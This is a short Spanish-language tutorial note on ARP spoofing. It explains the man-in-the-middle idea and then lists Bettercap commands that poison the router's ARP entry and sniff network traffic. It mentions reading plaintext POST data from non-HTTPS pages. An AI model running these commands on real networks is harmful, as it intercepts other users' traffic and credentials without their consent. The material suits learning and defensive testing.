#Attacks #Bettercap #ARP #Spoofing
### Explicación
Un ARP Spoofing consiste en hacer pensar a uno o varios dispositivos que la puerta de enlace es una distinta a la real. De esta forma, todas las peticiones pasarán por el dispositivo atacante, en este punto el dispositivo atacante podrá decidir de si redirecciona la petición a la verdadera puerta de enlace (en este caso sería un ataque `MAN IN THE MIDDLE`) o no redirecciona la petición, lo que haría que el dispositivo perdiera conectividad en la red.

### BetterCat
El primer paso es arrancar la herramienta.

`sudo bettercap`

Y, a continuación, escanear los dispositivos que hay en la red privada.

`net.probe on`

Este comando nos mostrará todos los dispositivos junto a su `IP` privada y `MAC`.
Ahora usaré un comando que nos mostrará todo de mejor forma y, además, nos indicará la puerta de enlace.

`ticker on`

En mi caso, la dirección `IP` de la puerta de enlace (`router`) es `192.168.0.1`

El siguiente paso es establecer el objetivo del ataque, en este caso el propio `router`.

`set arp.spoof targets 192.168.0.1`

Y activo el ataque.

`arp.spoof on`

Ahora la maquina atacante ya se encuentra en el medio de las comunicaciones entre cualquier dispositivo de la red y el `router`. Solo queda ponerse a escuchar lo que pasa a través de la maquina atacante (en este ejemplo uso el comando `set net.sniff.verbose false` para quitar información irrelevante)

```bash
set net.sniff.verbose false
net.sniff on
```

Ahora ya estamos escaneando todos los paquetes que viajan. En caso de hacerse alguna petición `POST` en una página sin protocolo `HTTPS` podremos ver en texto plano lo que se ha escrito.

